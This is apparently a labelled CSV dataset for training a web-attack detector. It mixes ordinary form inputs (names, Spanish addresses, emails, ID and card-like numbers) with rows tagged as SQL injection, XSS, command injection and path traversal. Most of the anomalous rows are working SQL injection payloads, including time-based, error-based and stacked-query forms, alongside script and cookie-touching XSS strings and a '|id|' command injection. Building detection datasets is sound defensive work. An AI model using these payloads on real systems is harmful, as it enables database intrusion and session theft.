payload,length,attack_type,label
"<embed src=""data:image/svg+xml;base64,phn2zyb4bwxuczpzdmc9imh0dh a6ly93d3cudzmub3jnlziwmdavc3zniib4bwxucz0iahr0cdovl3d3dy53my5vcmcv mjawmc9zdmciihhtbg5zonhsaw5rpsjodhrwoi8vd3d3lnczlm9yzy8xotk5l3hs aw5riib2zxjzaw9upsixljaiihg9ijaiihk9ijaiihdpzhropsixotqiighlawdodd0imjaw iibpzd0iehnzij48c2nyaxb0ihr5cgu9inrlehqvzwntyxnjcmlwdci+ywxlcnqoilh tuyipozwvc2nyaxb0pjwvc3znpg=="" type=""image/svg+xml"" allowscriptaccess=""always""></embed>",425,xss,anom
"<br size=""&{alert('xss')}"">",27,xss,anom
-2452'))) union all select 1951--,33,sqli,anom
"1%' or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null) and '%'='",117,sqli,anom
1'));waitfor delay '0:0:5' and (('nvqf'='nvqf,45,sqli,anom
ch56al2it0ra,12,norm,norm
08297,5,norm,norm
"1%"")(select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users) and (""%""=""",201,sqli,anom
"1') where 6672=6672 union all select null,null,null,null,null,null,null,null,null,null--",88,sqli,anom
-7773' or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq'),99,sqli,anom
"1'))) procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1) and ((('ichh' like 'ichh",160,sqli,anom
"avenida de la almozara 33,",26,norm,norm
"c/ duque de medinaceli, 55, 3?f",31,norm,norm
"1') and make_set(9961=6559,6559) and ('exde'='exde",50,sqli,anom
c/ rio elorz 141 11-h,21,norm,norm
"1"")) as tkmd where 3415=3415 and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610)))--",186,sqli,anom
58007817t,9,norm,norm
"1 where 6500=6500;call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",118,sqli,anom
r8mio34,7,norm,norm
villafrechs,11,norm,norm
1') or (select * from (select(sleep(5)))ydpu),45,sqli,anom
travessera muntanya 27,22,norm,norm
"-4964"")) union all select 4750,4750,4750,4750,4750--",52,sqli,anom
"1';select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and 'xemh'='xemh",102,sqli,anom
producti8,9,norm,norm
v433g3o5i6r79,13,norm,norm
1'+(select 'qbdh' where 4006=4006 and 7533=7533)+',50,sqli,anom
"-9987))) or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and (((2114=2114",220,sqli,anom
"1')) and elt(4460=2665,2665) and (('qmzu'='qmzu",47,sqli,anom
1 where 3502=3502 order by 1--,30,sqli,anom
walker@ebaz.vi,14,norm,norm
4107,4,norm,norm
flo hosta,9,norm,norm
jndula couttolenc,17,norm,norm
-7345) union all select 3866#,29,sqli,anom
burguillos de toledo,20,norm,norm
"travesia olmos, s/n 12e",23,norm,norm
7953040031397493,16,norm,norm
lian,4,norm,norm
"1' or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5) and 'xmnd'='xmnd",93,sqli,anom
rui-yuan,8,norm,norm
9766800722499068,16,norm,norm
ulano,5,norm,norm
robadora,8,norm,norm
cane5o,6,norm,norm
"1""))) or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5) and (((""fpkm"" like ""fpkm",104,sqli,anom
"-5292') union all select 1439,1439,1439,1439#",45,sqli,anom
"1%')(select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users) and ('%'='",201,sqli,anom
bonagura.orimoto@portaldesign.ht,32,norm,norm
1254,4,norm,norm
amayuela romay,14,norm,norm
"1') where 2121=2121 or 4915=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",114,sqli,anom
2935,4,norm,norm
1') as fxid where 5926=5926;if(7899=7899) select 7899 else drop function zbbp--,79,sqli,anom
1'+(select 'rejz' where 1530=1530 and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))))+',239,sqli,anom
89393853y,9,norm,norm
yamile de francisco,19,norm,norm
stief.kenworthy@todomodelos.edu,31,norm,norm
-7864 or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))# twpw,209,sqli,anom
3o7za732,8,norm,norm
hoss@926.yu,11,norm,norm
montnchez,9,norm,norm
78739097t,9,norm,norm
"passeig desert 180,",19,norm,norm
brazzel1@castigadas.am,22,norm,norm
d47tesi1,8,norm,norm
-4363%'))) or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq') and ((('%'=',116,sqli,anom
"""><script>alert('xssya')</script>",33,xss,anom
6a0ato,6,norm,norm
hwei-lin,8,norm,norm
viana,5,norm,norm
"-2085"") as hkev where 7730=7730 union all select 7730,7730--",60,sqli,anom
carew1@koinup.ni,16,norm,norm
"1') and make_set(6488=5525,5525)",32,sqli,anom
villanueva gualano,18,norm,norm
1';(select * from (select(sleep(5)))acdk)#,42,sqli,anom
"1%"" and 4595=4595#",18,sqli,anom
ot5ora,6,norm,norm
"1))) and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and (((6395=6395",217,sqli,anom
sebastian_ferdi@tintaultravioleta.mv,36,norm,norm
"camino ermita de la torre, 129,",31,norm,norm
"1))) union all select null,null,null,null,null,null,null,null#",62,sqli,anom
43061609c,9,norm,norm
f,1,norm,norm
brigitte,8,norm,norm
"1"") where 7513=7513 and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x)--",223,sqli,anom
4808731272531869,16,norm,norm
sonoramente,11,norm,norm
raimulfo,8,norm,norm
4890165807728190,16,norm,norm
"1)) as rqbo where 2243=2243 and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x))--",132,sqli,anom
"1) as iupg where 2861=2861 or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",178,sqli,anom
32170,5,norm,norm
glickman,8,norm,norm
29716,5,norm,norm
arceo feliu,11,norm,norm
apresivamente,13,norm,norm
"1') and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161) and ('dtym'='dtym",113,sqli,anom
volkman@acchportugal.py,23,norm,norm
astolfo,7,norm,norm
"-5362) union all select 7297,7297,7297,7297,7297#",49,sqli,anom
1'));select (case when (5856=7176) then 5856 else cast(1 as int)/(select 0 from dual) end) from dual--,102,sqli,anom
"grado, el",9,norm,norm
charmion,8,norm,norm
38993479s,9,norm,norm
abejar,6,norm,norm
mangot barra,12,norm,norm
berval.kazem@provider.com.sj,28,norm,norm
pospalatal,10,norm,norm
"1""));select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and ((""swec"" like ""swec",114,sqli,anom
juornneau@buscadordevideos.cr,29,norm,norm
-8701%')) or (4843=1690)*1690 and (('%'=',41,sqli,anom
82497790x,9,norm,norm
56359685w,9,norm,norm
35is117r,8,norm,norm
ulldecona,9,norm,norm
"1');select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3--",88,sqli,anom
"plaa tarent, 117, 2-h",21,norm,norm
"1%')));create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--",123,sqli,anom
osornillo,9,norm,norm
"1%""));select (case when (3486=6373) then 3486 else 3486*(select 3486 from mysql.db) end)#",89,sqli,anom
"c/ veinat de cerdanyola, 3 6e",29,norm,norm
40139732v,9,norm,norm
e00tr6o,7,norm,norm
jorge,5,norm,norm
/index.html|id|,15,cmdi,anom
yebra de basa,13,norm,norm
escribano peraldo,17,norm,norm
dehaven_carollo@muycurioso.lk,29,norm,norm
<script>a=/xss/nalert('xss');</script>,38,xss,anom
17rgu1r7,8,norm,norm
h61ng19a,8,norm,norm
"1')) as agdn where 8442=8442 and 3824=benchmark(5000000,md5(0x76555642))--",74,sqli,anom
1' and sleep(5),15,sqli,anom
henry,5,norm,norm
"camio da mina, 175,",19,norm,norm
"1 where 7240=7240 or 6979=like('abcdefg',upper(hex(randomblob(500000000/2))))--",79,sqli,anom
"-4166%"") union all select 5190--",32,sqli,anom
1'))) and (8982=8027)*8027 and ((('qkrv'='qkrv,46,sqli,anom
"1%"" and 8407=(select count(*) from generate_series(1,5000000)) and ""%""=""",72,sqli,anom
"1"" and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))",183,sqli,anom
48508,5,norm,norm
"1')) as yqek where 1957=1957;iif(5257=5257,1,1/0)",49,sqli,anom
"1')) or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x)) and (('lgcw'='lgcw",125,sqli,anom
15129,5,norm,norm
peralejos de abajo,18,norm,norm
sienes,6,norm,norm
"passeig de la plaa major 11, 3?f",32,norm,norm
fedro,5,norm,norm
6821418764083161,16,norm,norm
villaturiel,11,norm,norm
"1""))) or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71)) and (((""dzse""=""dzse",114,sqli,anom
"-7686%"") or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#",139,sqli,anom
7erg47,6,norm,norm
pao villalobos,14,norm,norm
"1) where 2741=2741 and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",126,sqli,anom
shorwan,7,norm,norm
lujn,4,norm,norm
pirotto nin,11,norm,norm
graehme,7,norm,norm
"1"")) or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x)) and ((""nwzu"" like ""nwzu",130,sqli,anom
61621455q,9,norm,norm
"1'))) or 8514=benchmark(5000000,md5(0x544d5a4c))#",49,sqli,anom
jorey@20horas.ao,16,norm,norm
"-1<img src=""jav ascript:document.cookie=true;"">",47,xss,anom
/............{file},19,path-traversal,anom
alsina aranguren,16,norm,norm
6441854276984473,16,norm,norm
-5062) where 7457=7457 or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual)--,255,sqli,anom
aida,4,norm,norm
vyky,4,norm,norm
"1%');select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and ('%'='",101,sqli,anom
"1%""))) and sleep(5) and (((""%""=""",32,sqli,anom
3572857528910134,16,norm,norm
"1"") as fcrx where 2929=2929 and 2820=5133",41,sqli,anom
"1))) or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and (((9802=9802",121,sqli,anom
"1"" or 8156=(select count(*) from generate_series(1,5000000))--",62,sqli,anom
bugarra,7,norm,norm
cassius,7,norm,norm
"1%'));iif(5519=4796,1,1/0)",26,sqli,anom
"1) where 7485=7485 and make_set(8403=8403,8899)--",49,sqli,anom
81878772z,9,norm,norm
new,3,norm,norm
3163610251088637,16,norm,norm
"1) where 2940=2940;select * from generate_series(4592,4592,case when (4592=4592) then 1 else 0 end) limit 1--",109,sqli,anom
pola,4,norm,norm
.corporativo,12,norm,norm
gatliff.charlton@eco-pro.jm,27,norm,norm
callos,6,norm,norm
08tiro72,8,norm,norm
stephano@clinicadentalsansalvador.nf,36,norm,norm
"1%"")) or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x) and ((""%""=""",218,sqli,anom
cresta-da,9,norm,norm
3891909303541723,16,norm,norm
"1') or 8384=like('abcdefg',upper(hex(randomblob(500000000/2)))) and ('lqql'='lqql",81,sqli,anom
"1'))) and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and ((('ibav'='ibav",176,sqli,anom
13100768z,9,norm,norm
cnudde.mccauley@waikilu.so,26,norm,norm
"1%';call regexp_substring(repeat(right(char(2385),0),500000000),null)--",71,sqli,anom
7770,4,norm,norm
01449063v,9,norm,norm
"-4407"") where 2055=2055 or elt(9714=5040,5040)--",48,sqli,anom
45634,5,norm,norm
jaiba,5,norm,norm
"plaza del yunque, 4,",20,norm,norm
7178886603205513,16,norm,norm
ben2,4,norm,norm
"calle muerdago, s/n,",20,norm,norm
09191,5,norm,norm
madridejos,10,norm,norm
5497,4,norm,norm
"c/ de la radio 81, 7?b",22,norm,norm
"1') or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x))",105,sqli,anom
deacetis,8,norm,norm
masmitj,7,norm,norm
conesa,6,norm,norm
1) as xwgf where 4204=4204 and sleep(5)--,41,sqli,anom
in85ecuacin,11,norm,norm
calle martin arredondo 31 9g,28,norm,norm
regis@magritte.us,17,norm,norm
1%');waitfor delay '0:0:5' and ('%'=',37,sqli,anom
peimel,6,norm,norm
molas madan,11,norm,norm
"-1<div style=""background-image: url(javascript:document.cookie=true;);"">",72,xss,anom
"1"") as duvm where 6190=6190 order by 1--",40,sqli,anom
"1'));select dbms_pipe.receive_message(chr(112)||chr(70)||chr(106)||chr(78),5) from dual--",89,sqli,anom
"-1031%"" union all select 6832,6832,6832,6832#",45,sqli,anom
"1' or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and 'lxqz'='lxqz",174,sqli,anom
"c/ja arco 125,",14,norm,norm
"1"") or char(119)||char(100)||char(99)||char(121)=regexp_substring(repeat(right(char(1441),0),5000000000),null)--",112,sqli,anom
herrmann@codwatw.edu,20,norm,norm
la rioja,8,norm,norm
39513,5,norm,norm
"1';select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and 'bnfu' like 'bnfu",119,sqli,anom
"1%');iif(5257=5257,1,1/0)",25,sqli,anom
calzada rebassa,15,norm,norm
"1' and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161) and 'kird'='kird",111,sqli,anom
"1%'))) or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and ((('%'='",112,sqli,anom
"camino san jaime 97,",20,norm,norm
2610767824117561,16,norm,norm
"calle brasil 185, 11f",21,norm,norm
"-4728"")) as ndri where 3278=3278 or make_set(9354=9354,7185)--",62,sqli,anom
68318279e,9,norm,norm
urbina granda,13,norm,norm
c/ cabo alomar blanes 122 10?b,30,norm,norm
8998,4,norm,norm
"plaa zenobia camprubi, 81, 13-d",31,norm,norm
1)));if(3490=4920) select 3490 else drop function hlzt--,56,sqli,anom
1' where 5455=5455 and sleep(5)--,33,sqli,anom
"1') and elt(1210=1210,sleep(5))",31,sqli,anom
nervino,7,norm,norm
"pl. zorrilla 110,",17,norm,norm
"general lacy, 122",17,norm,norm
"pobla de segur 125,",19,norm,norm
"1"")) and sleep(5) and ((""timv""=""timv",36,sqli,anom
"1') and char(109)||char(79)||char(70)||char(90)=regexp_substring(repeat(right(char(5012),0),5000000000),null)--",111,sqli,anom
1)) as xbii where 2262=2262 or sleep(5)--,41,sqli,anom
-7565') or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq') and ('gymz'='gymz,118,sqli,anom
"-5643')) union all select 1515,1515#",36,sqli,anom
"1')) as jntr where 5051=5051 and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a)--",201,sqli,anom
carpool,7,norm,norm
hus24lero,9,norm,norm
disney,6,norm,norm
9e3ed330a,9,norm,norm
gretal3,7,norm,norm
"1"")) as qhnb where 8302=8302 and (3020=3020)*6703--",51,sqli,anom
"c/ madrid, 53 5-f",17,norm,norm
d75a4r45der,11,norm,norm
"1%"")) union all select null,null,null,null,null,null,null#",58,sqli,anom
1) where 4479=4479 rlike (select (case when (6351=4367) then 1 else 0x28 end))--,80,sqli,anom
1';select sleep(5),18,sqli,anom
farhan,6,norm,norm
19784273h,9,norm,norm
41240,5,norm,norm
hakeem,6,norm,norm
reginald,8,norm,norm
"calle sol s/n,",14,norm,norm
"-6760 or 1570=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (1570=1570) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))# ikqw",206,sqli,anom
72nt89ct7v1,11,norm,norm
-5067')) or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq') and (('vkab' like 'vkab,125,sqli,anom
grea,4,norm,norm
50709909s,9,norm,norm
valle de mena,13,norm,norm
1'+(select trte where 9173=9173 and 2006=2006,45,sqli,anom
ridgley,7,norm,norm
ribera vitols,13,norm,norm
argem grive,11,norm,norm
"1'))) or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null) and ((('jhle' like 'jhle",134,sqli,anom
50293,5,norm,norm
"c/ doctor ferran, 193",21,norm,norm
1464,4,norm,norm
7301,4,norm,norm
kawahara,8,norm,norm
37170,5,norm,norm
servidio,8,norm,norm
9152015554982082,16,norm,norm
"1' in boolean mode);select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5#",106,sqli,anom
aldealengua de pedraza,22,norm,norm
54738650f,9,norm,norm
"-2901"" or elt(9866=9099,9099) and ""asib"" like ""asib",51,sqli,anom
sit agulla,10,norm,norm
7974,4,norm,norm
ponce vilda,11,norm,norm
-7610' or 3038=3038,19,sqli,anom
balaguer,8,norm,norm
27047841w,9,norm,norm
burgoa planells,15,norm,norm
"1%"")) or (select * from (select(sleep(5)))sddo)#",48,sqli,anom
"-8331') union all select 1452,1452,1452,1452,1452--",51,sqli,anom
siku@tartasconamor.in,21,norm,norm
-7984' order by 1--,19,sqli,anom
aluda,5,norm,norm
29691,5,norm,norm
6239536280691962,16,norm,norm
"1)) as bgdm where 3473=3473 or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666)--",120,sqli,anom
"1;select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3-- uugg",98,sqli,anom
neetu,5,norm,norm
"-1631%"") or elt(8285=1709,1709) and (""%""=""",42,sqli,anom
-4684) as uqjn where 4550=4550 or 1689=5825,43,sqli,anom
zapasiewicz@pinkplanetplasencia.bn,34,norm,norm
mediona,7,norm,norm
"-1<crosssitescripting style=""crosssitescripting:expression(document.cookie=true)"">",82,xss,anom
1'+(select smze where 5616=5616;select (case when (7978=6009) then 7978 else 1/(select 0) end)--,96,sqli,anom
hamzeh,6,norm,norm
52310665v,9,norm,norm
-8966%' or (7475=4014)*4014 and '%'=',37,sqli,anom
/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa................{file},282,path-traversal,anom
"1'+(select 'hoqt' where 4877=4877 or 4915=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",128,sqli,anom
bayuca,6,norm,norm
congostrina,11,norm,norm
"1') as pghp where 9086=9086;select dbms_pipe.receive_message(chr(112)||chr(70)||chr(106)||chr(78),5) from dual--",112,sqli,anom
1';select (case when (8993=4660) then 1 else 8993*(select 8993 from master..sysdatabases) end)--,96,sqli,anom
"1) where 8375=8375;select * from generate_series(6468,6468,case when (6468=7999) then 1 else 0 end) limit 1--",109,sqli,anom
1agostn,7,norm,norm
1') as bzem where 4240=4240;select sleep(5)--,45,sqli,anom
ch35isca,8,norm,norm
blancafort,10,norm,norm
franchetti.martinsan@elsentidodelavida.qa,41,norm,norm
lepe@eco-pro.mobi,17,norm,norm
caldes,6,norm,norm
00699529f,9,norm,norm
carraoso,8,norm,norm
"cartago 117, 12?b",17,norm,norm
kirk,4,norm,norm
"1' where 9206=9206;select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--",110,sqli,anom
"-2783' where 1494=1494 union all select 1494,1494,1494,1494,1494,1494--",71,sqli,anom
malcocinado,11,norm,norm
brihuega,8,norm,norm
1')) and (select * from (select(sleep(5)))fzno) and (('tjvy' like 'tjvy,71,sqli,anom
"-7069) union all select 6638,6638,6638,6638,6638,6638--",55,sqli,anom
farid,5,norm,norm
nicolo,6,norm,norm
